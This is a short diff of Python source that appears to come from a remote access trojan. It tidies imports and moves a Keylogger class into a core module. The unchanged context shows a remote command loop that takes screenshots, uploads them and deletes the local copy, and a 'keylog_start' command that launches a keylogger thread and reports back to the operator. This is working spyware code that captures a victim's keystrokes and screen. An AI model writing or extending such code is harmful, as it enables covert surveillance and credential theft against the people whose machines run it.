@@ -1,14 +1,15 @@
-import socket
 import json
-import subprocess
 import os
-import pyautogui
-import keylogger
-import threading
 import shutil
-import sys
+import socket
 import subprocess
+import sys
+import threading
 import time
+
+import pyautogui
+
+from core.keylogger import Keylogger
 
 
 def reliable_send(data):
@@ -97,7 +98,7 @@ def shell():
             upload_file('screen.png')
             os.remove('screen.png')
         elif command[:12] == 'keylog_start':
-            keylog = keylogger.Keylogger()
+            keylog = Keylogger()
             t = threading.Thread(target=keylog.start)
             t.start()
             reliable_send('[+] Keylogger started!')
